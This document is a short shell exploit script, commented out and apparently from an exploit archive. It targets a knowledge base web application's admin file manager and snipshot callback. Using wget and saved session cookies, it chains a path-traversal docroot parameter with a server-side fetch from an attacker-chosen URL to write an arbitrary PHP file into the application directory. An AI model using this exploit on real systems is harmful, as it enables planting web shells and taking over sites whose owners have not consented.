# #!/bin/sh
# echo "$0 <target_url> <relative_path_from_admin_dir> <file_name>
<content_url>
# example: $0 http://target.com/knowledge_base ../../../ file.php
http://source
# if kb is installed at knowledge_base, then the file: file.php will be
# created in the base application directory from the content at
http://source
# "
# sessionUrl=$1'/admin/de/dialog/file_manager.php'
# uploadUrl=$1'/admin/de/dialog/callback.snipshot.php'
# wget -O r1 --save-cookies tmp.cookies --keep-session-cookies
"$sessionUrl?userdocroot=$2&imgDir=&obj=1"
# echo "session created, setting file name $2$3"
# wget -O r2 --keep-session-cookies --load-cookies tmp.cookies
"$uploadUrl?action=step1&source_image=name&save_file_as=$3"
# echo "upload content from: $4 ..."
# wget -O r3 --keep-session-cookies --load-cookies tmp.cookies
"$uploadUrl?action=step2&source_image=name&save_file_as=$3&snipshot_output=$4"
# echo "file created test access to the script at: $1/admin/de/dialog/$2$3"; 